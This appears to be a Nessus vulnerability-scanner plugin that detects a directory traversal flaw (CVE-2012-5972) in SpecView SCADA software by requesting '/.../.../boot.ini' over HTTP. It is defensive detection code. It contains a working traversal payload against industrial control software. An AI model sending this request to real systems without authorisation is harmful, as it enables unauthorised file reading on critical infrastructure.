include("compat.inc");

if (description)
{
  script_id(19939);
  script_version("$Revision: 1 $");
  script_cvs_date("$Date: 2013/01/17 $");

  script_cve_id("CVE-2012-5972");
	script_bugtraq_id(54243);
	script_osvdb_id(83396);
	script_xref(name:"EDB-ID", value:"19455");

  script_name(english:"SpecView Traversal Arbitrary File Access");
  script_summary(english:"Checks for directory traversal vulnerability in SpecView");

  script_set_attribute(attribute:"synopsis", value:"It is possible to retrieve arbitrary files on the remote host.");
  script_set_attribute(attribute:"description", value:
"The remote host is running SpecView, a SCADA application
that communicates with industrial instrumentation and
displays and stores the information it receives.

The version of SpecView installed on the remote host is
prone to a directory traversal attack and, as such, allows an
unauthenticated attacker to read arbitrary files on the same filesystem
as the application.");
  script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/specview_1-adv.txt");
	script_set_attribute(attribute:"see_also", value:"https://ics-cert.us-cert.gov/advisories/ICSA-13-011-02");
  script_set_attribute(attribute:"solution", value:"Update to a version > 2.5 build 853");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/12/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

r = http_send_recv3(method: "GET",
	item:string("/.../.../.../.../.../.../.../.../.../.../.../.../.../.../boot.ini"),
	port:port,
	exit_on_fail:TRUE);

if ("[boot loader]" >< r[1]+r[2]) {
	security_hole(port);
}
